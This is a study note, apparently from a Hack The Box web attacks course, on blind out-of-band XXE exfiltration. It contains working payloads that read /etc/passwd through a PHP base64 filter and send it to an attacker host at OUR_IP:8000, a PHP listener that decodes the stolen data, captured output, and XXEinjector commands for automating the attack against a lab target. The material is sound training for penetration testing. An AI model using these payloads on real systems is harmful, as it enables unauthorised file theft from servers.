# Blind Data Exfiltration

## Out-of-band Data Exfiltration

This method is used when no data is returned at all (completly blind). This is similar to blind SQLi Blind XSS

Previously we already used out-of-band attack since we hosted DTD file in attack machine and made it connect to us (hence out-of-band).

This time will be similar except, instead of having web app output our file entity to a specific XML entity, we will make web app send request to server with content of the file we are reading.

1. Use parameter entitiy for content of file we are reading using PHP filter to base64 encode it.
2. Create another external parameter and reference it to our IP along with the value

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

When the XML tries to reference the external `oob` parameter from our machine, it will request along with the base64 encoded content. To decode it we will use PHP.

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```bash
nano index.php
php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

**Request body**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg" alt=""><figcaption><p>request sent</p></figcaption></figure>

our console will show as follow

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

> we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

### Automated OOB Exfiltration

[XXEinjector](https://github.com/enjoiz/XXEinjector). -> supports basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

We can **copy the HTTP request from Burp** and write it to a file for the tool to use. We should **not include the full XML data**, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

run the tool with the&#x20;

* `--host`/`--httpport` -> IP and port
* `--file` -> file we wrote above
* `--path` -> file we want to read
* `--oob=http` and `--phpfilter` -> OOB attack

```bash
ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:

```shell-session
cat Logs/10.129.201.94/etc/passwd.log 
```

## Assessment

Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
